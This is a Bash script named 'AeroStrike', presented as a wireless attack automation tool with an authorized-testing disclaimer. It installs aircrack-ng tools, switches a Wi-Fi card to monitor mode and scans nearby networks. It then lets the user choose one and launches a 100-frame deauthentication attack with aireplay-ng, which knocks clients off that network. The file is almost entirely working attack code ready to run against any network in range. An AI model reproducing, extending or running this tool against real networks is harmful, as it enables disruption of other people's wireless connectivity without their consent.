#!/bin/bash

# AeroStrike - Wireless Attack Automation Tool
# Version: 1.0
# Author: You
# Disclaimer: This tool is for authorized penetration testing and educational purposes only.

# Colors
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
CYAN="\033[0;36m"
RESET="\033[0m"

# Get attacker IP automatically
attacker_ip=$(ip route get 1 | awk '{print $7; exit}')

# Check Dependencies
check_dependencies() {
    echo -e "${CYAN}[*] Checking for dependencies...${RESET}"
    dependencies=("airmon-ng" "aireplay-ng" "airodump-ng" "mdk3" "airbase-ng" "iwconfig" "nc")
    missing=()

    for dep in "${dependencies[@]}"; do
        printf "${YELLOW}Checking: %-12s ...${RESET} " "$dep"
        sleep 0.2
        if ! command -v $dep &>/dev/null; then
            echo -e "${RED}Missing${RESET}"
            missing+=("$dep")
        else
            echo -e "${GREEN}Installed${RESET}"
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "\n${YELLOW}[!] Installing missing dependencies...${RESET}"
        for pkg in "${missing[@]}"; do
            echo -e "${CYAN}Installing: $pkg${RESET}"
            sudo apt-get install -y $pkg &>/dev/null
            if command -v $pkg &>/dev/null; then
                echo -e "${GREEN}Success: $pkg installed${RESET}"
            else
                echo -e "${RED}Failed: $pkg did not install. Please check manually.${RESET}"
            fi
        done
    else
        echo -e "\n${GREEN}[+] All dependencies are installed.${RESET}"
    fi
    sleep 1
}

# Interface selection
select_interface() {
    echo -e "${CYAN}[*] Available wireless interfaces:${RESET}"
    iw dev | awk '$1=="Interface"{print $2}'
    read -p "${CYAN}Enter the interface to use (e.g., wlan0): ${RESET}" interface
    sudo airmon-ng start $interface &>/dev/null
    interface="${interface}mon"
    echo -e "${GREEN}[+] Using interface: $interface${RESET}"
}

# Select and attack target
select_target() {
    tmpfile="targets.csv"
    echo "${CYAN}Scanning nearby Wi-Fi networks (press Ctrl+C after ~10 seconds)...${RESET}"
    sleep 1
    sudo airodump-ng $interface --band abg --output-format csv -w scan_output &> /dev/null &
    pid=$!
    sleep 10
    kill $pid 2>/dev/null

    if [ ! -f scan_output-01.csv ]; then
        echo "${RED}Scan failed or no networks found.${RESET}"
        return 1
    fi

    echo "${GREEN}Available Targets:${RESET}"
    grep -aE "([A-F0-9]{2}:){5}[A-F0-9]{2}" scan_output-01.csv |     awk -F',' 'BEGIN{count=0}
        /^[[:space:]]*([A-F0-9]{2}:){5}[A-F0-9]{2}/ {
            gsub(/^ +| +$/, "", $1);  # BSSID
            gsub(/^ +| +$/, "", $4);  # Channel
            gsub(/^ +| +$/, "", $14); # ESSID
            printf("%03d) BSSID: %-17s | Channel: %-2s | ESSID: %s\n", count++, $1, $4, $14)
            targets[count]=$1 ";" $4 ";" $14
        }
        END {
            for (i=1; i<=count; i++) print targets[i] > "'$tmpfile'"
        }'

    echo
    read -p "${CYAN}Enter target number: ${RESET}" choice
    selected=$(sed -n "$((choice + 1))p" $tmpfile)

    if [ -z "$selected" ]; then
        echo "${RED}Invalid selection.${RESET}"
        return 1
    fi

    IFS=';' read -r bssid channel essid <<< "$selected"
    echo -e "${YELLOW}Selected: BSSID=$bssid, Channel=$channel, ESSID=$essid${RESET}"

    echo "${CYAN}Launching quick deauth attack...${RESET}"
    sudo iwconfig $interface channel $channel
    sudo aireplay-ng --deauth 100 -a $bssid $interface
}

# Menu
main_menu() {
    while true; do
        echo -e "\n${CYAN}========= AeroStrike Main Menu =========${RESET}"
        echo "1) Check Dependencies"
        echo "2) Select Interface"
        echo "3) List & Attack Target"
        echo "4) Exit"
        echo -ne "${YELLOW}Select an option: ${RESET}"
        read choice

        case $choice in
            1) check_dependencies ;;
            2) select_interface ;;
            3) select_target ;;
            4) echo -e "${CYAN}Exiting AeroStrike.${RESET}"; exit 0 ;;
            *) echo -e "${RED}Invalid choice.${RESET}" ;;
        esac
    done
}

# Startup Banner
echo -e "${CYAN}
    ___              __        ______     __      
   /   |  ____  ____/ /__     / ____/  __/ /______
  / /| | / __ \/ __  / _ \   / __/ | |/_/ __/ ___/
 / ___ |/ / / / /_/ /  __/  / /____>  </ /_/ /__  
/_/  |_/_/ /_/\__,_/\___/  /_____/_/|_|\__/\___/  
                                                  
${RESET}"
sleep 1

check_dependencies
main_menu
